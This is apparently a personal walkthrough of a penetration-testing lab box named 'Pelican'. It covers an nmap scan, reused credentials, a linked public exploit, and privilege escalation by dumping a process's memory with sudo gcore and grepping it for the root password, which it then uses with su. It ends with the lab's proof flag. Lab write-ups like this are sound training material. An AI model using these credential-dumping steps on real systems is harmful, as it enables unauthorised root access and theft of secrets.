# nmap

```
sudo nmap -sC -sV 192.168.247.98 -oN nmap-pelican
```

![[PG/Linux/attachments/Pasted image 20250704141642.png]]

![[PG/Linux/attachments/Pasted image 20250704142509.png]]
# Web

![[PG/Linux/attachments/Pasted image 20250704141854.png]]

# Initial Access Creds (again)

```
charles / SupportDucklingDivision574
```

![[PG/Linux/attachments/Pasted image 20250704142158.png]]
- ssh didn't work

This exploit worked https://www.exploit-db.com/exploits/48654

![[PG/Linux/attachments/Pasted image 20250704144314.png]]

![[PG/Linux/attachments/Pasted image 20250704144250.png]]

I am charles in /opt/zookeeper

## Enum for Priv Esc 
```
sudo -l
```
![[PG/Linux/attachments/Pasted image 20250704144503.png]]

![[PG/Linux/attachments/Pasted image 20250704144553.png]]

Linpeas

Use gcore to try to read this file 
![[PG/Linux/attachments/Pasted image 20250704154303.png]]

```
sudo -u root /usr/bin/gcore -a -o /home/charles/output 494
```

![[PG/Linux/attachments/Pasted image 20250704154414.png]]

This is a core dump so can't just cat the file..

Running strings against this file 

```
strings output.494 | grep -A 10 -B 10 root
```

This looks like root pass - `ClogKingpinInning731`
![[PG/Linux/attachments/Pasted image 20250704154604.png]]

Try to switch to root user 

```
su root
```

Paste in `ClogKingpinInning731`


Got root.

![[PG/Linux/attachments/Pasted image 20250704154735.png]]

proof.txt

c7ada8c40b0a7f6af2a328c5d7263750